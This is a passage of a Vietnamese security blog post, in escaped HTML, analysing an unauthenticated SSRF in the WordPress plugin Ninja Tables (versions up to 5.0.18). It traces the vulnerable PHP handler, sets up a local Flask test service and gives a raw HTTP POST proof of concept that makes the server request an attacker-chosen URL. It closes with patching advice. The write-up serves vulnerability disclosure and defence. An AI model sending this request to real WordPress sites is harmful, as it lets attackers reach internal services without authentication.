src=&#39;http://localhost:1313/posts/2025-11-03-cve-2025-2940/diff.png&#39; alt=&#34;Patch diff&#34; height=&#34;687&#34; width=&#34;1552&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Vị trí tiền đề gây ra lỗ hổng&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Trong bản vá, đoạn mã dễ bị lợi dụng này đã được vô hiệu hoá (comment bằng &lt;code&gt;//&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public static function registerAsyncRequestHandler()&#xA;{&#xA;    $action = static::makeAsyncRequestAction();&#xA;&#xA;    App::addAction(&amp;#34;admin_post_nopriv_{$action}&amp;#34;, function() {&#xA;        &#xA;        $request = App::make(&amp;#39;request&amp;#39;);&#xA;        &#xA;        $requestUrl = $request-&amp;gt;get(&amp;#39;args.url&amp;#39;);&#xA;        &#xA;        $requestMethod = $request-&amp;gt;get(&amp;#39;args.method&amp;#39;);&#xA;        &#xA;        $client = Client::make($requestUrl);&#xA;        &#xA;        $params = $request-&amp;gt;except(&#xA;            &amp;#39;action&amp;#39;, &amp;#39;args.url&amp;#39;, &amp;#39;args.method&amp;#39;,&#xA;        )[&amp;#39;args&amp;#39;];&#xA;&#xA;        $callback = static::getCallback($params);&#xA;&#xA;        $response = $client-&amp;gt;{$requestMethod}(&amp;#39;&amp;#39;, $params);&#xA;&#xA;        if (is_wp_error($response)) {&#xA;            $exception = new Exception(&#xA;                $response-&amp;gt;get_error_message(), 500&#xA;            );&#xA;        }&#xA;&#xA;        return $callback($response, $exception ?? null);&#xA;    });&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;registerAsyncRequestHandler()&lt;/code&gt; là một trình đăng ký để tạo và xử lý một endpoint async trong WordPress - cụ thể là qua &lt;code&gt;admin_post_nopriv_{action}&lt;/code&gt;, tức là hook cho phép người dùng chưa đăng nhập (&lt;code&gt;nopriv&lt;/code&gt;) cũng có thể gửi request đến.&lt;/p&gt;&#xA;&lt;p&gt;Cụ thể, hàm sẽ xử lý như sau:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Tạo tên &lt;code&gt;action&lt;/code&gt; duy nhất cho plugin&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$action = static::makeAsyncRequestAction();&#xA;&#xA;protected static function makeAsyncRequestAction()&#xA;{&#xA;    return &amp;#39;wpf-async-request-&amp;#39; . sha1(&#xA;        App::config()-&amp;gt;get(&amp;#39;app.slug&amp;#39;) // plugin name: ninja-tables&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;makeAsyncRequestAction()&lt;/code&gt; tạo ra một chuỗi định danh duy nhất cho plugin bằng cách nối tiền tố cố định (&lt;code&gt;wpf-async-request-&lt;/code&gt;) với giá trị &lt;strong&gt;SHA1 hash&lt;/strong&gt; của tên plugin (&lt;code&gt;app.slug&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;p&gt;Vì plugin hiện tại có tên là &lt;code&gt;&amp;quot;ninja-tables&amp;quot;&lt;/code&gt;, nên kết quả trả về sẽ là:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Đăng ký action hook với callback là Anonymous function&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;App::addAction(&amp;#34;admin_post_nopriv_{$action}&amp;#34;, function() { ... });&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi có HTTP request gửi đến endpoint &lt;code&gt;/wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&lt;/code&gt; thì logic trong anonymous function sẽ được gọi.&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Lấy instance của &lt;code&gt;Request object&lt;/code&gt; từ container &lt;code&gt;App&lt;/code&gt; và lấy 2 tham số chính&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$request = App::make(&amp;#39;request&amp;#39;);&#xA;$requestUrl = $request-&amp;gt;get(&amp;#39;args.url&amp;#39;);&#xA;$requestMethod = $request-&amp;gt;get(&amp;#39;args.method&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Khởi tạo đối tượng &lt;code&gt;Client&lt;/code&gt; với &lt;code&gt;baseUrl&lt;/code&gt; lấy từ request&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$client = Client::make($requestUrl);&#xA;&#xA;public static function make($baseUrl = &amp;#39;&amp;#39;, $args = [])&#xA;{&#xA;    $args[&amp;#39;cookies&amp;#39;] = $args[&amp;#39;cookies&amp;#39;] ?? [];&#xA;    $args[&amp;#39;headers&amp;#39;] = $args[&amp;#39;headers&amp;#39;] ?? [];&#xA;    $args[&amp;#39;options&amp;#39;] = $args[&amp;#39;options&amp;#39;] ?? [];&#xA;    return new static($baseUrl, $args);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Phương thức &lt;code&gt;Client::make()&lt;/code&gt; chịu trách nhiệm &lt;strong&gt;tạo và cấu hình một instance mới của lớp &lt;code&gt;Client&lt;/code&gt;&lt;/strong&gt;, dùng để quản lý và gửi các HTTP request.&#xA;Giá trị &lt;code&gt;$baseUrl&lt;/code&gt; được truyền trực tiếp từ &lt;code&gt;$requestUrl&lt;/code&gt; - tức là URL mà người dùng cung cấp trong tham số &lt;code&gt;args.url&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Lấy tất cả tham số khác ngoài &lt;code&gt;action&lt;/code&gt;, &lt;code&gt;args.url&lt;/code&gt;, &lt;code&gt;args.method&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$params = $request-&amp;gt;except(&#xA;    &amp;#39;action&amp;#39;, &amp;#39;args.url&amp;#39;, &amp;#39;args.method&amp;#39;,&#xA;)[&amp;#39;args&amp;#39;];&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Giải mã và lấy hàm callback từ tham số request&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$callback = static::getCallback($params);&#xA;&#xA;protected static function getCallback(&amp;amp;$params)&#xA;{&#xA;    $callback = unserialize(base64_decode($params[&amp;#39;callback&amp;#39;]));&#xA;    unset($params[&amp;#39;callback&amp;#39;]);&#xA;    return $callback;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Phương thức &lt;code&gt;getCallback()&lt;/code&gt; dùng để &lt;strong&gt;trích xuất hàm callback&lt;/strong&gt; được gửi kèm trong tham số &lt;code&gt;args.callback&lt;/code&gt; của request.&lt;/p&gt;&#xA;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Gọi đến hàm &lt;code&gt;$requestMethod&lt;/code&gt; với đối số &lt;code&gt;$params&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$response = $client-&amp;gt;{$requestMethod}(&amp;#39;&amp;#39;, $params);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ví dụ: &lt;code&gt;$requestMethod&lt;/code&gt; là &lt;code&gt;POST&lt;/code&gt; =&amp;gt; &lt;code&gt;$response = $client-&amp;gt;POST(&#39;&#39;, $params)&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;8&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Kiểm tra lỗi và trả về&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (is_wp_error($response)) {&#xA;    $exception = new Exception(&#xA;        $response-&amp;gt;get_error_message(), 500&#xA;    );&#xA;}&#xA;&#xA;return $callback($response, $exception ?? null);&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition question open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-regular fa-circle-question&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Câu hỏi&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Điều gì xảy ra nếu &lt;code&gt;$requestMethod&lt;/code&gt; không tồn tại, tức &lt;code&gt;$client&lt;/code&gt; gọi đến một phương thức không có trong class &lt;code&gt;Client&lt;/code&gt;?&lt;/p&gt;&#xA;&lt;p&gt;Trong trường hợp này, PHP sẽ tự động gọi &lt;strong&gt;hàm magic &lt;code&gt;__call()&lt;/code&gt;&lt;/strong&gt; được khai báo trong class &lt;code&gt;Client&lt;/code&gt;.&#xA;Hàm &lt;code&gt;__call()&lt;/code&gt; được thiết kế để xử lý tất cả các lời gọi phương thức &lt;strong&gt;không tồn tại&lt;/strong&gt;, cho phép &lt;code&gt;Client&lt;/code&gt; thực hiện request động dựa trên tên phương thức được gọi.&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;Quan sát &lt;strong&gt;Outline tab&lt;/strong&gt; ta thấy được tất cả các &lt;strong&gt;method&lt;/strong&gt;, &lt;strong&gt;property&lt;/strong&gt; và các &lt;strong&gt;hàm&lt;/strong&gt; trong file theo thứ tự.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-03-cve-2025-2940/outline.png&#34; title=&#34;Outline của file Client.php&#34; data-thumbnail=&#34;/posts/2025-11-03-cve-2025-2940/outline.png&#34; data-sub-html=&#34;&lt;h2&gt;Outline&lt;/h2&gt;&lt;p&gt;Outline của file Client.php&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-03-cve-2025-2940/outline.png&#39; alt=&#34;Outline&#34; height=&#34;969&#34; width=&#34;644&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Outline của file Client.php&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function __call($method, $args)&#xA;{&#xA;    if ($method === &amp;#39;download&amp;#39;) {&#xA;        return $this-&amp;gt;downloadFile(...$args);&#xA;    }&#xA;    &#xA;    // Handles dynamic method calls like:&#xA;    // asyncGet, asyncPost and so on&#xA;    // get, post and so on&#xA;    $url = array_shift($args);&#xA;&#xA;    $parsed = parse_url($url);&#xA;&#xA;    if (!isset($parsed[&amp;#39;scheme&amp;#39;])) {&#xA;        $url = trim($this-&amp;gt;baseUrl, &amp;#39;/&amp;#39;) . &amp;#39;/&amp;#39; . trim($url, &amp;#39;/&amp;#39;);&#xA;    }&#xA;&#xA;    if (str_starts_with($method, &amp;#39;async&amp;#39;)) {&#xA;        $method = substr($method, strlen(&amp;#39;async&amp;#39;));&#xA;        $this-&amp;gt;checkIfValidHttpMethod($method);&#xA;        return $this-&amp;gt;asyncRequest(&#xA;            $url, $this-&amp;gt;buildRequestArgs($args, $method)&#xA;        );&#xA;    }&#xA;    &#xA;    $this-&amp;gt;checkIfValidHttpMethod($method);&#xA;    return $this-&amp;gt;request(&#xA;        $url, $this-&amp;gt;buildRequestArgs($args, $method)&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;__call()&lt;/code&gt; sẽ gọi đến &lt;code&gt;request()&lt;/code&gt; nếu method không phải &lt;code&gt;download&lt;/code&gt; và không bắt đầu bằng &lt;code&gt;async&lt;/code&gt; với url được set trước đó.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function request($url, $args = [])&#xA;{&#xA;    if ($query = http_build_query($this-&amp;gt;query)) {&#xA;        $url .= &amp;#39;?&amp;#39; . $query;&#xA;    }&#xA;&#xA;    $response = wp_remote_request($url, $args);&#xA;&#xA;    if (is_wp_error($response)) {&#xA;        throw new Exception($response-&amp;gt;get_error_message(), 500);&#xA;    }&#xA;    &#xA;    $this-&amp;gt;cookies = array_merge(&#xA;        $this-&amp;gt;cookies,&#xA;        wp_remote_retrieve_cookies($response)&#xA;    );&#xA;&#xA;    return $this-&amp;gt;makeResponse($response);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;request()&lt;/code&gt; thực hiện &lt;strong&gt;build query&lt;/strong&gt; và gửi request bằng &lt;code&gt;wp_remote_request()&lt;/code&gt; - hàm chính dẫn tới &lt;strong&gt;SSRF&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;HTTP Request&amp;#34;] --&amp;gt; B[&amp;#34;admin_post_nopriv_{action}&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;$request-&amp;gt;get(&amp;#39;args.url&amp;#39;) / $request-&amp;gt;get(&amp;#39;args.method&amp;#39;)&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;$client-&amp;gt;{$requestMethod}(&amp;#39;&amp;#39;, $params)&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Client::__call() → request() → wp_remote_request() ← SSRF sink&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Response → callback → HTTP Response&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Tạo local service đơn giản bằng python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/metadata&amp;#39;)&#xA;def metadata():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;@app.route(&amp;#39;/delete&amp;#39;)&#xA;def delete():&#xA;    file_id = request.args.get(&amp;#39;id&amp;#39;)&#xA;    if not file_id:&#xA;        return &amp;#34;No id provided&amp;#34;, 400&#xA;    print(f&amp;#34;delete it: {file_id}&amp;#34;)&#xA;    return f&amp;#34;Delete it: {file_id}&amp;#34;&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;content&amp;#34;: &amp;#34;Internal service data&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Gửi POST request với URL trỏ đến local service:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-post.php HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 &#xA;Accept: */*&#xA;Content-Type: application/x-www-form-urlencoded&#xA;Content-Length: 146&#xA;Connection: close&#xA;&#xA;action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&amp;amp;args[url]=http://localhost:8001/delete?id=1&amp;amp;args[method]=GET&amp;amp;args[name]=Tokuda&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-03-cve-2025-2940/result.png&#34; title=&#34;GET request tới local service&#34; data-thumbnail=&#34;/posts/2025-11-03-cve-2025-2940/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;GET request tới local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-03-cve-2025-2940/result.png&#39; alt=&#34;Result&#34; height=&#34;275&#34; width=&#34;960&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;GET request tới local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng SSRF trong &lt;strong&gt;Ninja Tables ≤ 5.0.18&lt;/strong&gt; cho thấy tham số &lt;code&gt;args[url]&lt;/code&gt; do client cung cấp được sử dụng trực tiếp để thực hiện request phía server mà không kiểm tra, cho phép attacker (không cần xác thực) buộc ứng dụng truy cập tới địa chỉ tùy ý. Bản vá &lt;strong&gt;≥ 5.0.19&lt;/strong&gt; đã loại bỏ đoạn mã nguy hiểm và khắc phục vector này.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nâng cấp ngay lên &lt;strong&gt;5.0.19&lt;/strong&gt; hoặc mới hơn.&lt;/li&gt;&#xA;&lt;li&gt;Không dùng trực tiếp input của client làm URL cho request — validate/normalize trước khi sử dụng.&lt;/li&gt;&#xA;&lt;li&gt;Áp dụng allowlist cho host/port và chặn private IP ranges (127.0.0.0/8, 10.0.0.0/8, 192.168.0.0/16, v.v.).&lt;/li&gt;&#xA;&lt;li&gt;Tránh đăng ký endpoint &lt;code&gt;admin_post_nopriv_*&lt;/code&gt; cho chức năng thực hiện outbound request hoặc thêm kiểm soát quyền/CSRF.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) — 